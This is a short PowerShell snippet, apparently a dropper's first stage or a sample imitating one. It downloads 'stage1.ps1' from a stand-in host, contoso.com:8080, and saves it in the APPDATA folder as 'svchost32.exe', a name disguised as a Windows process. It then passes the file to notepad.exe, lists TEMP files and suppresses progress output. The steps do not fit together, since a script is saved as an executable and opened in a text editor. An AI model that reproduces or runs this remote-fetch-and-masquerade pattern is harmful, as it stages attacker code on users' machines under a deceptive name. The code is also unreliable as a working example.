
<# Remote fetch #> $TargetUrl = 'http://contoso.com:8080/stage1.ps1'; $Stage2Path = "$env:APPDATA\svchost32.exe"; Invoke-WebRequest -Uri $TargetUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; $ProgressPreference = "SilentlyContinue"
